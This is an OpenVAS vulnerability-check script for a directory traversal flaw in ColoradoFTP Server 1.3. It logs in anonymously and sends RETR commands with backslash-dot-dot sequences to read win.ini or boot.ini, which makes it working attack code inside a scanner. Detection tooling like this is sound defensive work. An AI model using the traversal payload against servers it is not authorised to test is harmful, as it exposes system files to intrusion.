###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_colorado_ftp_server_dir_trav_vun.nasl 7579 2017-10-26 11:10:22Z cfischer $
#
# ColoradoFTP Server Directory Traversal Vulnerability
#
# Authors:
# Shakeel <bshakeel@secpod.com>
#
# Copyright:
# Copyright (C) 2016 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/a:colorado:coloradoftpserver";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.807877");
  script_version("$Revision: 7579 $");
  script_tag(name:"cvss_base", value:"6.4");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:N");
  script_tag(name:"last_modification", value:"$Date: 2017-10-26 13:10:22 +0200 (Thu, 26 Oct 2017) $");
  script_tag(name:"creation_date", value:"2016-08-17 16:19:22 +0530 (Wed, 17 Aug 2016)");
  script_name("ColoradoFTP Server Directory Traversal Vulnerability");

  script_tag(name:"summary", value:"The host is running ColoradoFTP server
  and is prone to directory traversal vulnerability.");

  script_tag(name:"vuldetect", value:"Send the crafted directory traversal
  attack request and check whether it is able to read the system file or not.");

  script_tag(name:"insight", value:"The flaw exists due to error in handling
  specially crafted commands like 'MKDIR', 'PUT', 'GET' or 'DEL' followed by
  sequences (\\\..\\).");

  script_tag(name:"impact", value:"Successful exploitation will allow a remote
  attacker to read arbitrary files on the affected application.

  Impact Level: System/Application");

  script_tag(name:"affected", value:"ColoradoFTP v1.3 Prime Edition (Build 8)
  Other versions may also be affected");

  script_tag(name:"solution", value:"Upgrade to ColoradoFTP Prime Edition (Build 9)
  or later. For updates refer to http://cftp.coldcore.com");

  script_tag(name:"solution_type", value:"VendorFix");

  script_tag(name:"qod_type", value:"remote_app");

  script_xref(name : "URL" , value : "https://www.exploit-db.com/exploits/40231");

  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2016 Greenbone Networks GmbH");
  script_family("FTP");
  script_dependencies("gb_colorado_ftp_server_detect.nasl", "secpod_ftp_anonymous.nasl");
  script_mandatory_keys("ColoradoFTP/Server/installed");
  script_require_ports("Services/ftp", 21);
  exit(0);
}

include("ftp_func.inc");
include("host_details.inc");

## Variable Initialization
ftplogin = "";
ftpPort = "";
banner = "";
user = "";
pass = "";
soc = "";

## Get FTP Port
if(!ftpPort = get_app_port(cpe:CPE)){
  exit(0);
}

## create the socket
soc = open_sock_tcp(ftpPort);
if(!soc){
  exit(0);
}

## Get the FTP user name and password
user = get_kb_item("ftp/login");
pass = get_kb_item("ftp/password");

## if not user name is given try with anonymous
if(!user){
  user = "anonymous";
}

## if not password is given try with arbitrary email
if(!pass){
  pass = string("a@b.com");
}

login_details = ftp_log_in(socket:soc, user:user, pass:pass);
if(!login_details)
{
 close(soc);
 exit(0);
}

## Change to PASV Mode
ftpPort2 = ftp_get_pasv_port(socket:soc);
if(!ftpPort2)
{
  close(soc);
  exit(0);
}

## Open a Socket and Send Crafted request
soc2 = open_sock_tcp(ftpPort2, transport:get_port_transport(ftpPort));
if(!soc2)
{
  close(soc);
  exit(0);
}

## List the possible system files
files = make_list("windows\\\\win.ini", "boot.ini", "winnt\\\\win.ini");
foreach file (files)
{
  ## Construct the attack request
  file = string ("\\\\\\..\\\\..\\\\..\\\\..\\\\..\\\\..\\\\..\\\\..\\\\..\\\\..\\\\..\\\\..\\\\", file);
  attackreq = string("RETR ", file);
  send(socket:soc, data:string(attackreq, "\r\n"));

  result = ftp_recv_data(socket:soc2);

  ## confirm the exploit
  if("\WINDOWS" >< result || "; for 16-bit app support" >< result
                                     || "[boot loader]" >< result)
  {
    security_message(ftpPort);
    close(soc2);
    close(soc);
    exit(0);
  }
}
close(soc);
close(soc2);
